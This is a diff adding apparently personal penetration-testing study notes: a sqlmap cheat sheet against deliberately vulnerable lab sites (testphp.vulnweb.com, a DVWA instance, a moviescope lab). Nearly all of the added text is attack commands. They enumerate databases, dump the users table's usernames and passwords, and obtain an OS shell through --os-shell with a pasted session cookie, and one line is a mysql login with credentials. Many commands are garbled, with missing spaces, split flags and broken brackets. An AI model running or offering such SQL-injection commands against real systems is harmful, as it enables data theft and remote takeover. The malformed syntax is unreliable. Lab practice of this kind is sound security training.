@@ -7,3 +7,23 @@ Download files:adb pull /path Do it in another shell, without adb connection!
 calcolate entropy : ent file.elf 
 After selecting file.elf with highest entropy, 
 SHA 384:sha384sum file.elf 
+
+
+Finding vulnerable site 
+site:http://testphp.vulnweb.com/php?= (for cookies- console->document.cookie) 
+{% hint style="info" %} Have cookie value is better, because reduce time to elaborate results! {% endhint %} 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1--dbs (databases) 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1-D acuart - tables (tables) 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1-D acuart - T users --columns (columns)
+
+Dump whole table 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1-D acuart - T users --dump
+OR (dump individual column data) 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1-D acuart - T users -C uname --dump 
+sqlmap -uhttp://testphp.vulnweb.com/artists.php?artist=1-D acuart - T users -C pass --dump 
+sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs [ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod [ If you have logins credentioals I 
+sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/? id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --dbs 
+Get list of tables -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -- cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql --tables 
+Dump data from tables -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -- cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql -T db --dump 
+Get OS shell -> sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/? id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --os-shell 
+{% content-ref url="../tools/sqlmap.md" %}sqlmap.md{% endcontent- ref %}
